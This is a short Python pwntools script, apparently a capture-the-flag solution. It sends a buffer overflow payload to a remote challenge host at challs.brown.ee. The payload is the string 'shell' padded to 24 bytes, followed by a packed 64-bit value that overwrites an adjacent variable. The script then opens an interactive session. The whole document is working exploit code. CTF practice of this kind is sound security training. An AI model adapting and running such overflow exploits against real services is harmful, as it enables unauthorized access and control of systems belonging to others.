from pwn import *
BUF_SIZE = 24
WANT_STR = b'shell'
TARGET_MONEY = p64(0xdeadbeef13371337)


padding = b'\x00' * (BUF_SIZE - len(WANT_STR))

output = WANT_STR + padding + TARGET_MONEY

print(output)

# p = process('./outsider')
# nc challs.brown.ee 32553
p = remote('challs.brown.ee', 32553)

print(p.recvuntil(b'like to buy? '))

p.sendline(output)

p.interactive()
